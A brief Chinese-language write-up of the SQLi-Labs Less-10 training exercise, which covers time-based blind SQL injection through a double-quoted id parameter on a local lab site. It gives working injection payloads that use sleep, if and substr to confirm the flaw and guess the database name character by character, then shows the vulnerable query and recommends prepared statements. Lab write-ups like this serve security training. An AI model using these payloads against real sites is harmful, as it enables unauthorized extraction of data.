# SQLi-Labs | Less-10 GET 双引号 时间盲注
## 一、漏洞简介
双引号字符型，页面固定回显，时间盲注。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-10/?id=1
## 三、复现步骤
1. ?id=1" and sleep(5) --+ 延时，确认注入
2. if+substr逐字符猜解
## 四、Payload
?id=1" and if(substr(database(),1,1)='s',sleep(5),1) --+
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE id="$id" LIMIT 0,1`
## 六、修复方案
预编译，禁用危险函数。
## 七、总结
和Less9一致，闭合改为双引号。